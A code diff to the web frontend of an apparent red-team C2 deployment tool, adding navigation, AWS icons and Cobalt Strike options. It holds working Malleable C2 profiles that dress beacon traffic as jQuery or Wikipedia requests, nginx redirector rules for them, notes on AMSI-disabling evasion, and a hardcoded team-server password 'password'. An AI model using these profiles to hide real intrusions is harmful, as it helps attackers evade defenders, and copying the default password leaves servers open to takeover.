@@ -4,12 +4,51 @@
 const API_BASE = '/api';
 
 // ============================================================================
+// AWS RESOURCE ICONS — Centralized icon system using official AWS SVGs
+// ============================================================================
+
+const AWS_ICON_PATH = 'assets/aws-icons';
+
+const AWS_ICON_MAP = {
+    'ec2': 'ec2.svg',        'instance': 'ec2.svg',
+    'vpc': 'vpc.svg',
+    'subnet': 'subnet.svg',
+    'sg': 'sg.svg',          'security_group': 'sg.svg',
+    'eip': 'eip.svg',        'elastic_ip': 'eip.svg',
+    'nat': 'nat.svg',        'nat_gateway': 'nat.svg',
+    's3': 's3.svg',          's3_bucket': 's3.svg',
+    'igw': 'igw.svg',        'internet_gateway': 'igw.svg',
+    'rtb': 'rtb.svg',        'route_table': 'rtb.svg',
+    'eni': 'eni.svg',        'network_interface': 'eni.svg',
+    'keypair': 'keypair.svg', 'key_pair': 'keypair.svg',
+    'pcx': 'pcx.svg',        'vpc_peering': 'pcx.svg',
+    'iam-role': 'iam-role.svg', 'iam_role': 'iam-role.svg',
+    'iam-profile': 'iam-profile.svg', 'iam_instance_profile': 'iam-profile.svg',
+    'route53-zone': 'route53.svg', 'route53': 'route53.svg',
+    'acm-cert': 'acm-cert.svg', 'acm': 'acm-cert.svg',
+    'secrets': 'secrets.svg', 'secretsmanager': 'secrets.svg',
+    'cloudfront': 'cloudfront.svg',
+    'default': 'default.svg'
+};
+
+/**
+ * Returns an <img> tag for the given AWS resource type.
+ * @param {string} type - Resource type key (e.g. 'ec2', 'vpc', 'sg')
+ * @param {number} size - Icon size in px (default 20)
+ * @returns {string} HTML <img> tag
+ */
+function awsIcon(type, size = 20) {
+    const file = AWS_ICON_MAP[type] || AWS_ICON_MAP['default'];
+    return `<img src="${AWS_ICON_PATH}/${file}" alt="${type}" style="width: ${size}px; height: ${size}px; vertical-align: middle; flex-shrink: 0;">`;
+}
+
+// ============================================================================
 // APPLICATION CORE - Tab Management System
 // ============================================================================
 
 const APP = {
     currentPage: 'dashboard',
-    pages: ['dashboard', 'configuration', 'deployment', 'deployments', 'aws-check', 'architecture', 'settings'],
+    pages: ['dashboard', 'configuration', 'deployment', 'deployments', 'tools', 'aws-check', 'architecture', 'beacon', 'settings'],
     
     /**
      * Initialize the application
@@ -23,11 +62,21 @@ const APP = {
         // Setup tab navigation
         this.setupNavigation();
 
-        // Load initial page
-        this.navigateTo('dashboard');
+        // Load initial page — restore from URL hash or sessionStorage
+        const hashPage = window.location.hash.replace('#', '');
+        const savedPage = sessionStorage.getItem('currentPage');
+        const initialPage = (hashPage && this.pages.includes(hashPage)) ? hashPage :
+                            (savedPage && this.pages.includes(savedPage)) ? savedPage : 'dashboard';
+        this.navigateTo(initialPage);
 
         // Setup event handlers
         this.setupEventHandlers();
+
+        // Restore active deployment project from sessionStorage
+        const savedProject = sessionStorage.getItem('activeDeploymentProject');
+        if (savedProject) {
+            window.currentDeploymentProject = savedProject;
+        }
 
         console.log('✅ Application initialized successfully');
     },
@@ -104,12 +153,25 @@ const APP = {
             return;
         }
         
+        // Stop beacon polling when leaving beacon page
+        if (this.currentPage === 'beacon') {
+            BEACON.stopHealthPoll();
+        }
+
         // Clear deployment polling when leaving the deployment page
         if (this.currentPage === 'deployment' && pageName !== 'deployment') {
             if (deploymentPollInterval) {
                 clearInterval(deploymentPollInterval);
                 deploymentPollInterval = null;
-                console.log('🛑 Cleared deployment polling interval');
+            }
+        }
+
+        // Stop auto-refresh and destroy poll when leaving deployments page
+        if (this.currentPage === 'deployments' && pageName !== 'deployments') {
+            stopAutoRefresh();
+            if (window._destroyPollInterval) {
+                clearInterval(window._destroyPollInterval);
+                window._destroyPollInterval = null;
             }
         }
         
@@ -143,9 +205,11 @@ const APP = {
             targetButton.classList.add('active');
         }
         
-        // Update current page
+        // Update current page and persist for refresh
         this.currentPage = pageName;
-        
+        sessionStorage.setItem('currentPage', pageName);
+        window.location.hash = pageName;
+
         // Load page-specific content
         this.loadPageContent(pageName);
     },
@@ -168,6 +232,7 @@ const APP = {
                 case 'deployment':
                     // Reset plan state when navigating to deployment page
                     isPlanRunning = false;
+                    resetDeployValidation();
                     loadConfigSummary();
                     checkDeploymentStatus();
                     checkDomainConfig();
@@ -177,7 +242,10 @@ const APP = {
                     break;
                 case 'deployments':
                     loadDeploymentsPage();
-                    loadDeploymentDetails();  // Load comprehensive details
+                    startAutoRefresh();
+                    break;
+                case 'tools':
+                    loadToolsPage();
                     break;
                 case 'aws-check':
                     // AWS page is interactive, no auto-load
@@ -188,9 +256,11 @@ const APP = {
                         initArchitecturePage();
                     }
                     break;
+                case 'beacon':
+                    BEACON.init();
+                    break;
                 case 'settings':
-                    // Settings page is static for now
-                    console.log('Settings page ready');
+                    initSettingsPage();
                     break;
                 default:
                     console.log(`No specific loader for: ${pageName}`);
@@ -228,13 +298,53 @@ const APP = {
             deleteCSClientBtn.addEventListener('click', handleCSClientDelete);
         }
         
+        // CS password radio toggles (on Deploy page)
+        document.querySelectorAll('input[name="cs-pw-mode"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                const manualInfo = document.getElementById('cs-pw-manual-info');
+                const presetFields = document.getElementById('cs-pw-preset-fields');
+                if (manualInfo) manualInfo.style.display = this.value === 'manual' ? 'block' : 'none';
+                if (presetFields) presetFields.style.display = this.value === 'preset' ? 'block' : 'none';
+            });
+        });
+
+        // CS license mode radio toggles (on Deploy page)
+        document.querySelectorAll('input[name="cs-license-mode"]').forEach(radio => {
+            radio.addEventListener('change', function() {
+                const manualInfo = document.getElementById('cs-license-manual-info');
+                const secretFields = document.getElementById('cs-license-secret-fields');
+                if (manualInfo) manualInfo.style.display = this.value === 'manual' ? 'block' : 'none';
+                if (secretFields) secretFields.style.display = this.value === 'secret' ? 'block' : 'none';
+            });
+        });
+
+        // REST API toggle behavior
+        const restApiToggle = document.getElementById('enable-rest-api');
+        const restApiInfo = document.getElementById('rest-api-info');
+        if (restApiToggle) {
+            restApiToggle.addEventListener('change', function() {
+                restApiInfo.style.display = this.checked ? 'block' : 'none';
+
+                // When REST API enabled, auto-set password to 'password' in preset mode
+                if (this.checked) {
+                    const presetRadio = document.querySelector('input[name="cs-pw-mode"][value="preset"]');
+                    const passwordInput = document.getElementById('cs-teamserver-password');
+                    if (presetRadio) presetRadio.checked = true;
+                    if (passwordInput) {
+                        passwordInput.value = 'password';
+                        presetRadio.dispatchEvent(new Event('change'));
+                    }
+                }
+            });
+        }
+
         // Project name input - validate on input with debounce
         const projectNameInput = document.getElementById('project-name');
         if (projectNameInput) {
             projectNameInput.addEventListener('input', debouncedProjectNameCheck);
             projectNameInput.addEventListener('blur', () => validateProjectName(true));
         }
-        
+
         // SSL configuration handlers
         this.setupSSLHandlers();
 
@@ -332,10 +442,15 @@ const APP = {
     /**
      * Setup Malleable C2 Profile preview handlers
      */
+    // Cache for fetched catalog profile content (avoids re-fetching on tab switch)
+    _catalogProfileCache: {},
+
     setupMalleableProfileHandlers() {
         const profileSelect = document.getElementById('malleable-profile');
         if (profileSelect) {
             profileSelect.addEventListener('change', () => this.updateProfilePreview());
+            // Load BC-SECURITY catalog profiles into dropdown
+            this.loadProfileCatalog();
             // Render initial preview
             this.updateProfilePreview();
         }
@@ -344,14 +459,12 @@ const APP = {
         document.querySelectorAll('.profile-preview-tab').forEach(tab => {
             tab.addEventListener('click', (e) => {
                 const targetTab = e.target.dataset.tab;
-                // Update tab styles
+                // Update tab styles — remove inline styles, let CSS .active class handle it
                 document.querySelectorAll('.profile-preview-tab').forEach(t => {
-                    t.style.background = 'var(--bg-elevated)';
-                    t.style.color = 'var(--text-secondary)';
+                    t.style.background = '';
+                    t.style.color = '';
                     t.classList.remove('active');
                 });
-                e.target.style.background = 'var(--brand)';
-                e.target.style.color = 'var(--text-primary)';
                 e.target.classList.add('active');
                 // Show/hide content
                 document.querySelectorAll('.profile-preview-content').forEach(c => {
@@ -364,6 +477,53 @@ const APP = {
     },
 
     /**
+     * Load BC-SECURITY Malleable C2 profile catalog into dropdown optgroups
+     */
+    async loadProfileCatalog() {
+        try {
+            const resp = await fetch(`${API_BASE}/profiles/`);
+            const data = await resp.json();
+            if (!data.success || !data.categories) return;
+
+            for (const [category, profiles] of Object.entries(data.categories)) {
+                const group = document.getElementById(`profiles-${category.toLowerCase()}`);
+                if (!group) continue;
+                profiles.forEach(name => {
+                    const opt = document.createElement('option');
+                    opt.value = `catalog:${category}/${name}`;
+                    opt.textContent = name.replace('.profile', '').replace(/_/g, ' ');
+                    group.appendChild(opt);
+                });
+            }
+        } catch (e) {
+            console.warn('Failed to load profile catalog:', e);
+        }
+    },
+
+    /**
+     * Fetch a catalog profile's content from the backend
+     */
+    async fetchCatalogProfile(catalogValue) {
+        if (this._catalogProfileCache[catalogValue]) {
+            return this._catalogProfileCache[catalogValue];
+        }
+        // catalogValue format: "catalog:Category/name.profile"
+        const path = catalogValue.replace('catalog:', '');
+        const [category, name] = path.split('/');
+        try {
+            const resp = await fetch(`${API_BASE}/profiles/${category}/${name}`);
+            const data = await resp.json();
+            if (data.success) {
+                this._catalogProfileCache[catalogValue] = data.content;
+                return data.content;
+            }
+        } catch (e) {
+            console.error('Failed to fetch catalog profile:', e);
+        }
+        return null;
+    },
+
+    /**
      * Update the profile preview based on selected profile type
      * When domain fronting is enabled and a front domain is provided,
      * appends a domain fronting config block to the CS profile preview.
@@ -372,7 +532,95 @@ const APP = {
         const profileType = document.getElementById('malleable-profile')?.value || 'default';
         const csCode = document.getElementById('cs-profile-code');
         const nginxCode = document.getElementById('nginx-uris-code');
+        const trafficCode = document.getElementById('example-traffic-code');
         if (!csCode || !nginxCode) return;
+
+        const isCustom = profileType === 'custom';
+        const isCatalog = profileType.startsWith('catalog:');
+        const isBuiltIn = !isCustom && !isCatalog;
+        const builtInProfiles = ['default', 'amazon', 'google', 'microsoft', 'wikipedia'];
+
+        // Get all status/display elements
+        const autoStatus = document.getElementById('profile-auto-status');
+        const catalogStatus = document.getElementById('profile-catalog-status');
+        const customStatus = document.getElementById('profile-custom-status');
+        const customPaste = document.getElementById('custom-profile-paste');
+        const profilePreview = document.getElementById('malleable-profile-preview');
+        const profileHint = document.getElementById('profile-type-hint');
+        const validationStatus = document.getElementById('profile-validation-status');
+
+        // Hide all status banners first
+        if (autoStatus) autoStatus.style.display = 'none';
+        if (catalogStatus) catalogStatus.style.display = 'none';
+        if (customStatus) customStatus.style.display = 'none';
+        if (customPaste) customPaste.style.display = 'none';
+        if (validationStatus) validationStatus.style.display = 'none';
+
+        // Show appropriate UI for each profile type
+        if (isCustom) {
+            if (customStatus) customStatus.style.display = 'block';
+            if (customPaste) customPaste.style.display = 'block';
+            if (profilePreview) profilePreview.style.display = 'none';
+            if (profileHint) profileHint.textContent = 'Paste your profile below. URIs will be auto-extracted for team server and nginx configuration.';
+
+            // Hook up auto-parsing of pasted profile content
+            const textarea = document.getElementById('custom-profile-content');
+            if (textarea && !textarea._parserAttached) {
+                textarea._parserAttached = true;
+                textarea.addEventListener('input', () => {
+                    this._handleProfileTextInput(textarea.value);
+                });
+            }
+            return;
+        }
+
+        if (isCatalog) {
+            // Catalog profile from BC-SECURITY
+            if (catalogStatus) catalogStatus.style.display = 'block';
+            if (profilePreview) profilePreview.style.display = 'block';
+            if (profileHint) profileHint.textContent = 'Profile from BC-SECURITY catalog. Will be auto-deployed to team server and nginx auto-configured.';
+
+            // Fetch and display the catalog profile
+            this.fetchCatalogProfile(profileType).then(content => {
+                if (!content) {
+                    csCode.textContent = '# Failed to load profile. Try again or select a different profile.';
+                    nginxCode.textContent = '';
+                    return;
+                }
+
+                csCode.textContent = content;
+
+                // Parse URIs and generate nginx config
+                const parsed = parseMalleableProfileURIs(content);
+                const hasURIs = parsed.get.length || parsed.post.length || parsed.stager_x86.length || parsed.stager_x64.length;
+                nginxCode.textContent = hasURIs ? generateNginxFromURIs(parsed) : '# No URIs detected in this profile';
+
+                // Generate example traffic
+                if (trafficCode) trafficCode.textContent = generateExampleTraffic(content);
+
+                // Run validation and show results
+                const validation = validateMalleableProfile(content);
+                this._showValidationResults(validation, document.getElementById('profile-validation-status'));
+            });
+            return;
+        }
+
+        // Built-in preset profile
+        if (autoStatus) {
+            autoStatus.style.display = 'block';
+            const profileLabels = { default: 'jQuery CDN', amazon: 'Amazon CDN', google: 'Google APIs', microsoft: 'Microsoft Azure', wikipedia: 'Wikipedia' };
+            autoStatus.className = 'callout callout--success';
+            autoStatus.innerHTML = `<p style="margin: 0; font-size: 0.9em;">
+                <strong>Fully automated.</strong> The <strong>${profileLabels[profileType] || profileType}</strong> profile will be loaded on the team server at startup
+                and nginx redirector URI patterns will be auto-configured to match. No manual setup required.
+            </p>`;
+        }
+        if (profilePreview) profilePreview.style.display = 'block';
+        if (profileHint) {
+            profileHint.textContent = profileType === 'default'
+                ? 'jQuery profile from threatexpress/malleable-c2. Auto-loaded on team server, nginx auto-configured.'
+                : 'Profile with full OPSEC hardening. Auto-loaded on team server, nginx auto-configured.';
+        }
 
         const profiles = this.getMalleableProfiles();
         const profile = profiles[profileType] || profiles['default'];
@@ -422,7 +670,82 @@ const APP = {
 
         csCode.textContent = csContent;
         nginxCode.textContent = profile.nginx;
+        if (trafficCode) trafficCode.textContent = generateExampleTraffic(profile.cs);
     },
+
+    /**
+     * Handle profile text input (shared by custom paste and catalog preview validation)
+     */
+    _handleProfileTextInput(text) {
+        const parsed = parseMalleableProfileURIs(text);
+        const hasURIs = parsed.get.length || parsed.post.length || parsed.stager_x86.length || parsed.stager_x64.length;
+        const preview = document.getElementById('custom-uri-preview');
+        const nginxPreview = document.getElementById('custom-nginx-preview');
+
+        if (preview) {
+            if (hasURIs) {
+                preview.style.display = 'block';
+                preview.innerHTML = `
+                    <div style="font-size: 0.88em; margin-bottom: 6px;"><strong>Extracted URIs:</strong></div>
+                    <div class="terminal-block">
+                        ${parsed.get.length ? `<div class="t-success">GET: ${parsed.get.join(', ')}</div>` : ''}
+                        ${parsed.post.length ? `<div class="t-warning">POST: ${parsed.post.join(', ')}</div>` : ''}
+                        ${parsed.stager_x86.length ? `<div class="t-terminal">Stager x86: ${parsed.stager_x86.join(', ')}</div>` : ''}
+                        ${parsed.stager_x64.length ? `<div class="t-terminal">Stager x64: ${parsed.stager_x64.join(', ')}</div>` : ''}
+                    </div>`;
+            } else if (text.trim().length > 50) {
+                preview.style.display = 'block';
+                preview.innerHTML = `<div style="font-size: 0.88em; color: var(--warning-text);">No URIs detected. Ensure your profile has <code>http-get</code>, <code>http-post</code>, or <code>http-stager</code> blocks with <code>set uri "..."</code> directives.</div>`;
+            } else {
+                preview.style.display = 'none';
+            }
+        }
+        if (nginxPreview) {
+            if (hasURIs) {
+                nginxPreview.style.display = 'block';
+                nginxPreview.querySelector('code').textContent = generateNginxFromURIs(parsed);
+            } else {
+                nginxPreview.style.display = 'none';
+            }
+        }
+
+        // Run validation if there's enough content
+        if (text.trim().length > 50) {
+            const validation = validateMalleableProfile(text);
+            this._showValidationResults(validation, document.getElementById('profile-validation-status'));
+        }
+    },
+
+    /**
+     * Display profile validation results
+     */
+    _showValidationResults(validation, container) {
+        if (!container) return;
+        if (!validation.errors.length && !validation.warnings.length) {
+            container.style.display = 'block';
+            container.innerHTML = `<div class="callout callout--success" style="margin: 0;"><p style="margin: 0; font-size: 0.88em;">
+                <strong>Profile validation passed.</strong> Required blocks found, URIs valid.
+            </p></div>`;
+            return;
+        }
+
+        let html = '';
+        if (validation.errors.length) {
+            html += `<div class="callout callout--danger" style="margin: 0 0 8px 0;"><p style="margin: 0; font-size: 0.88em;">
+                <strong>Errors:</strong></p><ul style="margin: 4px 0 0 0; padding-left: 20px; font-size: 0.85em;">
+                ${validation.errors.map(e => `<li>${e}</li>`).join('')}
+            </ul></div>`;
+        }
+        if (validation.warnings.length) {
+            html += `<div class="callout callout--warning" style="margin: 0;"><p style="margin: 0; font-size: 0.88em;">
+                <strong>Warnings:</strong></p><ul style="margin: 4px 0 0 0; padding-left: 20px; font-size: 0.85em;">
+                ${validation.warnings.map(w => `<li>${w}</li>`).join('')}
+            </ul></div>`;
+        }
+        container.style.display = 'block';
+        container.innerHTML = html;
+    },
+
 
     /**
      * Malleable C2 profile data for each profile type
@@ -430,131 +753,97 @@ const APP = {
     getMalleableProfiles() {
         return {
             'default': {
-                cs: `# jQuery Malleable C2 Profile
-# Mimics jQuery CDN requests — blends with common web traffic
+                cs: `# jQuery Malleable C2 Profile (Default)
+# Source: https://github.com/threatexpress/malleable-c2/blob/master/jquery-c2.4.9.profile
+# Auto-loaded on team server at startup — no manual configuration needed.
+#
+# This profile disguises beacon traffic as jQuery CDN requests.
+# The full profile is downloaded from GitHub during deployment.
+# Below is a summary of the key settings.
 
-set sleeptime "30000";
-set jitter    "20";
-set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+set sample_name "jQuery CS 4.9 Profile";
+set sleeptime "45000";         # 45 seconds
+set jitter    "37";            # 37% jitter
+set useragent "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko";
 
 https-certificate {
-    set CN       "cdn.jsdelivr.net";
-    set O        "jQuery Foundation";
+    set C   "US";
+    set CN  "jquery.com";
+    set O   "jQuery";
+    set OU  "Certificate Authority";
     set validity "365";
 }
 
 http-get {
     set uri "/jquery-3.3.1.min.js";
-
+    set verb "GET";
     client {
-        header "Accept" "application/javascript, text/javascript, */*; q=0.01";
-        header "Referer" "https://code.jquery.com/";
-        header "Accept-Language" "en-US,en;q=0.9";
-
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        header "Referer" "http://code.jquery.com/";
         metadata {
             base64url;
-            append ";session=";
+            prepend "__cfduid=";
             header "Cookie";
         }
     }
-
     server {
         header "Content-Type" "application/javascript; charset=utf-8";
-        header "Cache-Control" "max-age=0, no-cache";
         header "Server" "NetDNA-cache/2.2";
-
-        output {
-            base64url;
-            prepend "/*! jQuery v3.3.1 | (c) JS Foundation and other contributors | jquery.org/license */\\n";
-            append "\\n/* End jQuery */";
-            print;
-        }
+        output { mask; base64url; print; }
     }
 }
 
 http-post {
-    set uri "/api/telemetry";
+    set uri "/jquery-3.3.2.min.js";
     set verb "POST";
-
     client {
-        header "Content-Type" "application/json";
-        header "Accept" "application/json";
-
-        id {
-            base64url;
-            header "X-Request-ID";
-        }
-
-        output {
-            base64url;
-            print;
-        }
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        header "Referer" "http://code.jquery.com/";
+        id { mask; base64url; parameter "__cfduid"; }
+        output { mask; base64url; print; }
     }
-
     server {
-        header "Content-Type" "application/json";
-
-        output {
-            base64url;
-            prepend "{\\"status\\":\\"ok\\",\\"data\\":\\"";
-            append "\\"}";
-            print;
-        }
+        header "Content-Type" "application/javascript; charset=utf-8";
+        header "Server" "NetDNA-cache/2.2";
+        output { mask; base64url; print; }
     }
 }
 
 http-stager {
-    set uri_x86 "/assets/js/analytics.min.js";
-    set uri_x64 "/assets/js/analytics.x64.min.js";
-
+    set uri_x86 "/jquery-3.3.1.slim.min.js";
+    set uri_x64 "/jquery-3.3.2.slim.min.js";
     client {
-        header "Accept" "application/javascript, */*";
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
     }
-
     server {
-        header "Content-Type" "application/javascript";
+        header "Content-Type" "application/javascript; charset=utf-8";
     }
-}`,
-                nginx: `# Nginx URI patterns for jQuery profile
-# Deploy these in /etc/nginx/sites-available/c2-redirector
+}
 
-# GET beacon (http-get uri: /jquery-3.3.1.min.js)
-location ~ ^/jquery-3\\.[0-9]+\\.[0-9]+\\.min\\.js$ {
-    if ($http_accept !~* "application/javascript|text/javascript|\\*/\\*") {
-        return 404;
-    }
+# Full profile includes: stage, post-ex, process-inject blocks
+# with OPSEC hardening (sleep_mask, obfuscate, amsi_disable, etc.)`,
+                nginx: `# Nginx URI patterns for jQuery profile (default)
+# Source: https://github.com/threatexpress/malleable-c2
+# Auto-configured on redirectors during deployment.
+#
+# Matches ALL jQuery profile URIs with a single location block:
+#   GET:    /jquery-3.3.1.min.js       (beacon check-in)
+#   POST:   /jquery-3.3.2.min.js       (beacon data)
+#   Stager: /jquery-3.3.1.slim.min.js  (x86)
+#           /jquery-3.3.2.slim.min.js  (x64)
+
+location ~ ^/jquery-3\\.[0-9]+\\.[0-9]+(\\.slim)?\\.min\\.js$ {
     proxy_pass https://c2_backend;
     proxy_http_version 1.1;
     proxy_set_header Host $host;
     proxy_set_header X-Real-IP $remote_addr;
     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
     proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Connection "";
     proxy_connect_timeout 60s;
+    proxy_send_timeout 60s;
     proxy_read_timeout 300s;
-}
-
-# POST beacon (http-post uri: /api/telemetry)
-location = /api/telemetry {
-    if ($request_method != POST) {
-        return 405;
-    }
-    proxy_pass https://c2_backend;
-    proxy_http_version 1.1;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
     client_max_body_size 100M;
-}
-
-# Stager (http-stager uri: /assets/js/analytics.*.min.js)
-location ~ ^/assets/js/analytics\\.(min|x64\\.min)\\.js$ {
-    proxy_pass https://c2_backend;
-    proxy_http_version 1.1;
-    proxy_set_header Host $host;
-    proxy_set_header X-Real-IP $remote_addr;
-    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
-    proxy_set_header X-Forwarded-Proto $scheme;
 }`
             },
             'amazon': {
@@ -644,7 +933,10 @@ http-stager {
         header "Content-Type" "application/octet-stream";
         header "Server" "AmazonEC2";
     }
-}`,
+}
+
+# Full profile includes: http-config, stage, post-ex, process-inject blocks
+# with OPSEC hardening (trust_x_forwarded_for, sleep_mask, obfuscate, amsi_disable, etc.)`,
                 nginx: `# Nginx URI patterns for Amazon CDN profile
 # Deploy these in /etc/nginx/sites-available/c2-redirector
 
@@ -771,7 +1063,10 @@ http-stager {
         header "Content-Type" "application/json";
         header "Server" "GSE";
     }
-}`,
+}
+
+# Full profile includes: http-config, stage, post-ex, process-inject blocks
+# with OPSEC hardening (trust_x_forwarded_for, sleep_mask, obfuscate, amsi_disable, etc.)`,
                 nginx: `# Nginx URI patterns for Google APIs profile
 # Deploy these in /etc/nginx/sites-available/c2-redirector
 
@@ -899,7 +1194,10 @@ http-stager {
         header "Content-Type" "text/html; charset=utf-8";
         header "Server" "Microsoft-IIS/10.0";
     }
-}`,
+}
+
+# Full profile includes: http-config, stage, post-ex, process-inject blocks
+# with OPSEC hardening (trust_x_forwarded_for, sleep_mask, obfuscate, amsi_disable, etc.)`,
                 nginx: `# Nginx URI patterns for Microsoft Azure profile
 # Deploy these in /etc/nginx/sites-available/c2-redirector
 
@@ -937,6 +1235,164 @@ location ~ ^/connect/oauth2/authorize(64)?$ {
     proxy_set_header X-Real-IP $remote_addr;
     proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
     proxy_set_header X-Forwarded-Proto $scheme;
+}`
+            },
+            'wikipedia': {
+                cs: `# Wikipedia Malleable C2 Profile
+# Based on: @bluscreenofjeff wikipedia.profile (modernized)
+# Auto-loaded on team server at startup — no manual configuration needed.
+#
+# Mimics Wikipedia search and article browsing traffic.
+# URIs must match nginx redirector location blocks:
+#   GET:    /w/index.php?search=...  (beacon check-in as wiki search)
+#   POST:   /wiki/<session_id>       (beacon data as article view)
+#   Stager: /w/load.php (x86)       (MediaWiki resource loader)
+#           /w/api.php (x64)        (MediaWiki API endpoint)
+
+set sample_name "Wikipedia Profile";
+set sleeptime "60000";
+set jitter    "20";
+set host_stage "false";
+set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36";
+
+dns-beacon {
+    set dns_idle "8.8.4.4";
+    set maxdns    "235";
+}
+
+https-certificate {
+    set CN       "*.wikipedia.org";
+    set C        "US";
+    set L        "San Francisco";
+    set O        "Wikimedia Foundation Inc";
+    set OU       "IT";
+    set ST       "California";
+    set validity "365";
+}
+
+http-get {
+    set uri "/w/index.php";
+
+    client {
+        header "Host" "en.wikipedia.org";
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        header "Referer" "https://en.wikipedia.org/wiki/Main_Page";
+        header "Accept-Language" "en-US,en;q=0.9";
+
+        metadata {
+            base64url;
+            parameter "search";
+        }
+        parameter "title" "Special%3ASearch";
+        parameter "go" "Go";
+    }
+
+    server {
+        header "Content-Type" "text/html; charset=UTF-8";
+        header "Server" "mw-web.eqiad.main-84d4bc876f";
+        header "X-Content-Type-Options" "nosniff";
+        header "Vary" "Accept-Encoding,Cookie,Authorization";
+
+        output {
+            netbios;
+            prepend "<!DOCTYPE html><html lang=en><head><meta charset=UTF-8><title>Search - Wikipedia</title></head><body class=mediawiki><div id=content><div class=searchresults>";
+            append "</div></div></body></html>";
+            print;
+        }
+    }
+}
+
+http-post {
+    set uri "/wiki";
+    set verb "GET";
+
+    client {
+        header "Host" "en.wikipedia.org";
+        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+        header "Accept-Language" "en-US,en;q=0.9";
+
+        id {
+            base64url;
+            prepend "/";
+            uri-append;
+        }
+
+        output {
+            base64url;
+            prepend "https://en.wikipedia.org/w/index.php?search=";
+            append "&title=Special%3ASearch&go=Go";
+            header "Referer";
+        }
+    }
+
+    server {
+        header "Content-Type" "text/html; charset=UTF-8";
+        header "Server" "mw-web.eqiad.main-84d4bc876f";
+        header "X-Content-Type-Options" "nosniff";
+        header "Vary" "Accept-Encoding,Cookie,Authorization";
+
+        output {
+            prepend "<html><head><title>Wikipedia</title></head><body class=mediawiki><div id=content><h1>Wikipedia</h1><div id=mw-content-text>";
+            print;
+        }
+    }
+}
+
+http-stager {
+    set uri_x86 "/w/load.php";
+    set uri_x64 "/w/api.php";
+
+    client {
+        header "Host" "en.wikipedia.org";
+        header "Accept" "text/css,*/*;q=0.1";
+    }
+
+    server {
+        header "Content-Type" "text/javascript; charset=utf-8";
+        header "Server" "mw-web.eqiad.main-84d4bc876f";
+    }
+}
+
+# Full profile includes: http-config, stage, post-ex, process-inject blocks
+# with OPSEC hardening (trust_x_forwarded_for, sleep_mask, obfuscate, amsi_disable, etc.)`,
+                nginx: `# Nginx URI patterns for Wikipedia profile
+# Auto-configured on redirectors during deployment.
+#
+# Matches Wikipedia-themed URIs:
+#   GET:    /w/index.php             (beacon check-in as search query)
+#   POST:   /wiki/<session_id>       (beacon data as article view, uri-append)
+#   Stager: /w/load.php              (x86 - MediaWiki resource loader)
+#           /w/api.php               (x64 - MediaWiki API)
+
+# GET beacon + Stager (all /w/*.php MediaWiki endpoints)
+location ~ ^/w/(index|load|api)\\.php$ {
+    proxy_pass https://c2_backend;
+    proxy_http_version 1.1;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Connection "";
+    proxy_connect_timeout 60s;
+    proxy_send_timeout 60s;
+    proxy_read_timeout 300s;
+    client_max_body_size 100M;
+}
+
+# POST beacon (http-post: /wiki/<session_id> via uri-append)
+# Prefix match handles the session ID appended as a path component
+location ~ ^/wiki(/|$) {
+    proxy_pass https://c2_backend;
+    proxy_http_version 1.1;
+    proxy_set_header Host $host;
+    proxy_set_header X-Real-IP $remote_addr;
+    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    proxy_set_header X-Forwarded-Proto $scheme;
+    proxy_set_header Connection "";
+    proxy_connect_timeout 60s;
+    proxy_send_timeout 60s;
+    proxy_read_timeout 300s;
+    client_max_body_size 100M;
 }`
             },
             'custom': {
@@ -1072,6 +1528,375 @@ location = <YOUR_STAGER_URI_X64> {
 };
 
 // ============================================================================
+// MALLEABLE C2 PROFILE PARSER
+// ============================================================================
+
+/**
+ * Parse a Malleable C2 profile text to extract URIs for http-get, http-post, and http-stager blocks.
+ * Returns { get: ["/uri"], post: ["/uri"], stager_x86: ["/uri"], stager_x64: ["/uri"] }
+ *
+ * Handles:
+ *   set uri "/path1 /path2";           → space-separated multiple URIs
+ *   set uri_x86 "/path";               → stager-specific URIs
+ *   set uri_x64 "/path";
+ *
+ * Limitations: does not handle deeply nested includes or #include directives.
+ * Accuracy: ~90-95% for standard profiles (strict syntax).
+ */
+function parseMalleableProfileURIs(profileText) {
+    const result = { get: [], post: [], stager_x86: [], stager_x64: [] };
+    if (!profileText || typeof profileText !== 'string') return result;
+
+    // Remove comments (lines starting with # and inline // comments)
+    const lines = profileText.split('\n');
+    const cleaned = lines.filter(l => !l.trim().startsWith('#')).join('\n');
+
+    // Find block boundaries using brace counting
+    function findBlock(text, blockName) {
+        // Match the block declaration (not inside another block)
+        const regex = new RegExp(`(?:^|\\n)\\s*${blockName}\\s*\\{`, 'g');
+        const match = regex.exec(text);
+        if (!match) return null;
+
+        let depth = 1;
+        let start = match.index + match[0].length;
+        for (let i = start; i < text.length; i++) {
+            if (text[i] === '{') depth++;
+            if (text[i] === '}') depth--;
+            if (depth === 0) return text.substring(start, i);
+        }
+        return null;
+    }
+
+    // Extract 'set uri "..."' values from a block, handling space-separated URIs
+    function extractURIs(blockContent, key = 'uri') {
+        if (!blockContent) return [];
+        const uriRegex = new RegExp(`set\\s+${key}\\s+"([^"]+)"`, 'g');
+        const uris = [];
+        let m;
